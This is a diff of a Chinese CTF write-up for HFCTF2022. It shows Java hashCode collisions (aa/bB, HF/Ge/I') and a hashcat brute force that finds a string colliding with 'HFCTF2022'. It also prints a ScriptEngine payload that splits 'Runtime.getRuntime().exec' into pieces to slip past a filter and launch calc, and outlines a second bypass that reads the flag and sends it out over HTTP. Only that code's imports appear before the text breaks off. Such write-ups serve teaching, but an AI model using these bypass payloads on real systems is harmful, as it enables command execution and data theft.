@@ -70,7 +70,7 @@ char val[] = value;
 
 计算的关键就是for循环中的h = 31 * h + val[i]，对字符串的每一个字符依次进行该运算。下面有几个例子
 
-```
+```text
 //97
 "a".hashCode()
 //97*31+98=3105
@@ -79,26 +79,26 @@ char val[] = value;
 ```
 
 可以看到前面字符的hash值也会影响后续hash值，于是我们能够构造出如下等式：
-```
+```text
 31*h1 + a[i] = 31*h2 + b[j]
 (h1-h2)*31 = b[j]-a[i]   
 ```
 
 假如有字符串aa，我们能够很容易计算出与之hash相等的另一字符串bB
 
-```
+```text
 //bB --> aa
 31*98 + 66 = 3104 = 31*97 + 97 (aa)
 ```
 
 后续字符串的hash也相等
 
-```
+```text
 //trueSystem.out.println("bBDDD".hashCode()=="aaDDD".hashCode());   
 ```
 
 因此本题想要构造出与HFCTF2022的hash相等的另一字符串，我们只需要找到与字符HF的hash相等的字符即可：
-```
+```text
 HF=31*72+70=2302=31*71+101=Ge=31*73+39=I'
 ```
 
@@ -108,12 +108,12 @@ HF=31*72+70=2302=31*71+101=Ge=31*73+39=I'
 
 先算出给出字符串的hash值（用16进制表示）,然后用hashcat爆破：
 
-```
+```text
 System.out.println(Integer.toHexString("HFCTF2022".hashCode())); //865bf5b5
 
 hashcat.exe -m 18700 -a 3 865bf5b5 --show 
 ```
-```
+```text
 xxxxx\hashcat-6.2.5>hashcat.exe -m 18700 -a 3 865bf5b5 --show
 865bf5b5:18wd6vi
 ```
@@ -134,7 +134,8 @@ xxxxx\hashcat-6.2.5>hashcat.exe -m 18700 -a 3 865bf5b5 --show
 `cmd = new javax.script.ScriptEngineManager(null).getEngineByName("js").eval("java.lang.Run".concat("time.getRun").concat("time().exec('calc')"))`
 
 绕过方法二:只是限制了不能执行命令,还有其他的读文件等操作可以进行,所以可以读出文件内容再通过http将flag发送出来:
-```
+
+```java
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.file.Files;
